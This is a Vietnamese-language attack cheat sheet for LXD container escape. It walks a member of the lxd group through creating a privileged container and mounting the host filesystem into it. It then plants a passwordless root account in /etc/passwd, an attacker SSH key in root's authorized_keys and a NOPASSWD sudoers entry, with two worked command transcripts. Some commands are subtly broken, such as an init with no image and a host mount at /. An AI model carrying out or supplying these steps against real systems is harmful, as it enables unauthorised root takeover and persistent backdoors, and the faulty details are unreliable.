# Container Escapes

## Điểm chính khai thác

* Khai thác LXD để leo thang đặc quyền lên **root** bằng cách tạo container đặc quyền với `security.privileged=true`, cho phép truy cập toàn bộ hệ thống tệp máy chủ
* Người dùng thuộc nhóm `lxd` (kiểm tra bằng `id`) có thể tạo container đặc quyền, tương đương quyền root trên máy chủ do không bị giới hạn namespace
* Ánh xạ hệ thống tệp máy chủ vào container (dùng `lxc config device add`) cho phép sửa đổi tệp nhạy cảm như `/etc/passwd` hoặc `/root/.ssh/authorized_keys`
* Có thể tạo tệp nhị phân SUID hoặc shell ngược trong container để duy trì truy cập root trên máy chủ
* Phát hiện LXD bằng `lxc list`, `id`, hoặc **pspy** để xác định tiến trình liên quan, đặc biệt trong môi trường Linux có LXD cài đặt

## Các bước khai thác

### Kiểm tra lỗ hổng

#### Xác định mục tiêu tiềm năng

Kiểm tra xem người dùng có thuộc nhóm `lxd` để xác nhận khả năng truy cập LXD:

```
id
```

Output mong đợi: Nhóm `lxd`, ví dụ: `uid=1000(user) gid=1000(user) groups=1000(user),100(lxd)`

Xác minh LXD hoạt động và người dùng có quyền sử dụng:

```
lxc list
```

Output mong đợi: Danh sách container hoặc không có lỗi, ví dụ: `+---------+---------+`

#### Kiểm tra quyền truy cập hoặc cấu hình

Kiểm tra quyền ghi trên thư mục tạm để lưu trữ payload hoặc công cụ:

```
ls -ld /tmp
```

Output mong đợi: Quyền thư mục, ví dụ: `drwxrwxrwt 10 root root 4096`

#### Phân tích ngữ cảnh thực thi

Kiểm tra tiến trình LXD để xác nhận hoạt động:

```
pspy
```

Output mong đợi: Tiến trình LXD, ví dụ: `UID=0 PID=1234 | /usr/bin/lxd`

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Tạo container đặc quyền với chế độ `security.privileged=true`:

```
lxc init privesc -c security.privileged=true
```

Output mong đợi: Container được tạo, ví dụ: `Creating privesc`

Gắn toàn bộ hệ thống tệp máy chủ vào container:

```
lxc config device add privesc root disk path=/ source=/ recursive=true
```

Output mong đợi: Thiết bị được thêm, ví dụ: `Device root added to privesc`

#### Áp dụng khai thác

Khởi động container đặc quyền:

```
lxc start privesc
```

Output mong đợi: Container khởi động, ví dụ: `Container privesc started`

Truy cập container để thao túng hệ thống tệp máy chủ:

```
lxc exec privesc /bin/bash
```

Output mong đợi: Shell trong container, ví dụ: `root@privesc:/#`

Thêm người dùng root vào `/etc/passwd` trong container:

```
echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd
```

Ghi chú: Sửa đổi này ảnh hưởng trực tiếp `/etc/passwd` trên máy chủ do ánh xạ hệ thống tệp.

Thêm khóa SSH công khai vào `/root/.ssh/authorized_keys`:

```
mkdir -p /root/.ssh
echo "<your_ssh_public_key>" >> /root/.ssh/authorized_keys
```

Ghi chú: Thay `<your_ssh_public_key>` bằng khóa SSH công khai của bạn. Đảm bảo thư mục `/root/.ssh` có quyền phù hợp.

#### Kích hoạt khai thác

Chuyển sang người dùng root mới trên máy chủ:

```
su hacker
```

Output mong đợi: Shell root, ví dụ: `uid=0(root)`

Truy cập SSH với quyền root bằng khóa đã thêm:

```
ssh root@<target_ip> -i <private_key>
```

Ghi chú: Thay `<target_ip>` và `<private_key>` bằng IP máy chủ và khóa SSH riêng. Output mong đợi: Shell root.

### Kiểm tra kết quả

Xác nhận quyền root trên máy chủ:

```
whoami
```

Output mong đợi: `root`\
Xác nhận: Thử lệnh yêu cầu quyền cao, ví dụ: `echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers`.

## Ví dụ khai thác

### Khai thác LXD để Thêm Người dùng Root

**Kịch bản mẫu**: Người dùng thuộc nhóm `lxd` trên máy chủ Ubuntu 20.04 với LXD cài đặt. Tạo container đặc quyền để sửa `/etc/passwd` và thêm người dùng root.\
**Output**:

```
id
uid=1000(user) gid=1000(user) groups=1000(user),100(lxd)

lxc list
+---------+---------+

lxc init privesc -c security.privileged=true
lxc config device add privesc root disk path=/ source=/ recursive=true
lxc start privesc
lxc exec privesc /bin/bash

echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd
exit

su hacker
whoami
root
```

### Khai thác LXD để Thêm Khóa SSH

**Kịch bản mẫu**: Người dùng thuộc nhóm `lxd` trên máy chủ Ubuntu 20.04. Tạo container đặc quyền để thêm khóa SSH vào `/root/.ssh/authorized_keys` và truy cập root qua SSH.\
**Output**:

```
id
uid=1000(user) gid=1000(user) groups=1000(user),100(lxd)

lxc list
+---------+---------+

lxc init privesc -c security.privileged=true
lxc config device add privesc root disk path=/ source=/ recursive=true
lxc start privesc
lxc exec privesc /bin/bash

mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@machine" >> /root/.ssh/authorized_keys
exit

ssh root@192.168.1.101 -i id_rsa
whoami
root
```
